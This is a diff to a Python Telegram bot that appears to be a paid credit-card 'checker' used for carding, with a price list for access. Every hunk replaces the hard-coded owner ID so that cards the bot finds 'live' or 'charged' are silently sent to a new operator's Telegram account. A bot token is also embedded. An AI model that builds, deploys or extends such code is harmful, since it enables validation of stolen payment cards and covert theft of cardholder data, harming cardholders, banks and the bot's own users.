@@ -17,7 +17,7 @@ import re
 token = "7959620740:AAFAHbQYPrW2KXmzwog4lMiv0XQUVgJ0aEM" 
 bot=telebot.TeleBot(token,parse_mode="HTML")
 
-owners = ["7826066230"]
+owners = ["1172862169"]
         
 # Function to check if the user's ID is in the id.txt file
 def is_user_allowed(user_id):
@@ -68,7 +68,7 @@ def generate_redeem_code():
 
 @bot.message_handler(commands=["code"])
 def generate_code(message):
-    if str(message.chat.id) == '7826066230':
+    if str(message.chat.id) == '1172862169':
         new_code = generate_redeem_code()
         valid_redeem_codes.append(new_code)
         bot.reply_to(
@@ -129,7 +129,7 @@ def start(message):
 You Are Not Authorized to Use this Bot
 
 Your User ID: {user_id}
-Required Owner ID: 7826066230
+Required Owner ID: 1172862169
 
 ⤿ 𝙋𝙧𝙞𝙘𝙚 𝙇𝙞𝙨𝙩 ⚡
 ⤿ 1 day - 90rs/3$ 
@@ -328,7 +328,7 @@ def main(message):
 					
 					# Send to owner
 					try:
-						bot.send_message(7826066230, f"🎯 <b>LIVE CARD FOUND!</b>\n\n{msg}", parse_mode="HTML")
+						bot.send_message(1172862169, f"🎯 <b>LIVE CARD FOUND!</b>\n\n{msg}", parse_mode="HTML")
 					except:
 						pass
 						
@@ -339,7 +339,7 @@ def main(message):
 					
 					# Send to owner
 					try:
-						bot.send_message(7826066230, f"🎯 <b>LIVE CARD FOUND!</b>\n\n{msg}", parse_mode="HTML")
+						bot.send_message(1172862169, f"🎯 <b>LIVE CARD FOUND!</b>\n\n{msg}", parse_mode="HTML")
 					except:
 						pass
 						
@@ -350,7 +350,7 @@ def main(message):
 					
 					# Send to owner
 					try:
-						bot.send_message(7826066230, f"🎯 <b>LIVE CARD FOUND!</b>\n\n{msg}", parse_mode="HTML")
+						bot.send_message(1172862169, f"🎯 <b>LIVE CARD FOUND!</b>\n\n{msg}", parse_mode="HTML")
 					except:
 						pass
 						
@@ -375,7 +375,7 @@ def main(message):
 					
 					# Send to owner
 					try:
-						bot.send_message(7826066230, f"🎯 <b>CHARGED CARD FOUND!</b>\n\n{msg1}", parse_mode="HTML")
+						bot.send_message(1172862169, f"🎯 <b>CHARGED CARD FOUND!</b>\n\n{msg1}", parse_mode="HTML")
 					except:
 						pass
 				else:
@@ -454,7 +454,7 @@ def get_chat_id(message):
 • For channels: Add -100 before the ID
 
 📝 <b>Example:</b>
-• Private chat: <code>7736734364</code>
+• Private chat: <code>1172862169</code>
 • Group: <code>-4863319353</code>
 • Channel: <code>-1001234567890</code>
 """
@@ -543,7 +543,7 @@ def chk(message):
             
             # Send to owner
             try:
-                bot.send_message(7826066230, f"🎯 <b>LIVE CARD FOUND!</b>\n\n{message_ra}", parse_mode="HTML")
+                bot.send_message(1172862169, f"🎯 <b>LIVE CARD FOUND!</b>\n\n{message_ra}", parse_mode="HTML")
             except:
                 pass
                 
@@ -565,7 +565,7 @@ def chk(message):
             
             # Send to owner
             try:
-                bot.send_message(7826066230, f"🎯 <b>CHARGED CARD FOUND!</b>\n\n{msg_sec}", parse_mode="HTML")
+                bot.send_message(1172862169, f"🎯 <b>CHARGED CARD FOUND!</b>\n\n{msg_sec}", parse_mode="HTML")
             except:
                 pass
                 
